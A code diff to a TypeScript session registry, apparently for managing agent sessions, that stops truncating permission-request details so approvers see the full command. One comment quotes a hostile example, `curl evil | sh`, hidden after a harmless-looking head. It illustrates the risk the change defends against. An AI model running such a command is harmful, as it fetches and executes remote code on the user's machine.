@@ -205,8 +205,6 @@ export class SessionRegistry {
     // cooperation needed. Terminal states first; a permission hold sticks
     // until the turn moves again (4.6).
     const prev = entry.status;
-    const prevActivity = entry.activity?.label;
-    const prevPending = entry.permissions.length;
     if (msg.type === "turn_end" || msg.type === "error" || msg.type === "bang_end") {
       entry.status = "idle";
     } else if (msg.type === "permission_request") {
@@ -214,11 +212,30 @@ export class SessionRegistry {
     } else {
       entry.status = "working";
     }
-    // Cockpit metadata (M.1), same stream-derivation idea. Activity: what
-    // the session is doing right now — `since` resets only when the label
-    // CHANGES, so a re-announced identical status keeps its elapsed time.
-    // The in-session status line persists through text streaming until
-    // turn_end (RenderZone), so holding the last label here is faithful.
+    if (this.captureCockpit(entry, msg, prev) || entry.status !== prev) {
+      this.notifyWatchers();
+    }
+    for (const viewport of entry.viewports) viewport(msg);
+  }
+
+  /**
+   * Cockpit metadata (M.1), derived off the same stream `status` is — runs
+   * AFTER the status derivation (the idle-clear reads the new status) with
+   * `prevStatus` from before it. Returns true when watcher-visible metadata
+   * changed beyond the status flip itself.
+   */
+  private captureCockpit(
+    entry: SessionEntry,
+    msg: WireMsg,
+    prevStatus: SessionMeta["status"],
+  ): boolean {
+    const prevActivity = entry.activity?.label;
+    const prevPending = entry.permissions.length;
+    // Activity: what the session is doing right now — `since` resets only
+    // when the label CHANGES, so a re-announced identical status keeps its
+    // elapsed time. The in-session status line persists through text
+    // streaming until turn_end (RenderZone), so holding the last label here
+    // is faithful.
     if (msg.type === "status") {
       const label = msg.state === "tool" ? (msg.label ?? "tool") : "thinking";
       if (prevActivity !== label) entry.activity = { label, since: Date.now() };
@@ -237,24 +254,22 @@ export class SessionRegistry {
     // only via its own timeout — the documented v1 honesty bound, the same
     // one the status dot already has.)
     if (msg.type === "permission_request") {
-      entry.permissions.push({
-        id: msg.id,
-        tool: msg.tool,
-        detail: msg.detail.slice(0, 200),
-      });
-    } else if (prev === "permission") {
+      // The FULL detail — never truncated. Grid allow/deny is a real
+      // approval decision, so the fleet approver must see exactly what the
+      // in-session bar shows; a capped detail could hide a dangerous tail
+      // (`…harmless… && curl evil | sh`) past a benign head (2026-07-24
+      // audit). The detail already reaches every viewport in the original
+      // permission_request; copying it whole here leaks nothing new.
+      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail });
+    } else if (prevStatus === "permission") {
       entry.permissions = [];
     }
     if (msg.type === "usage") entry.usage = foldUsage(entry.usage, msg);
-    if (
-      entry.status !== prev ||
+    return (
       entry.activity?.label !== prevActivity ||
       entry.permissions.length !== prevPending ||
       msg.type === "usage"
-    ) {
-      this.notifyWatchers();
-    }
-    for (const viewport of entry.viewports) viewport(msg);
+    );
   }
 
   /**
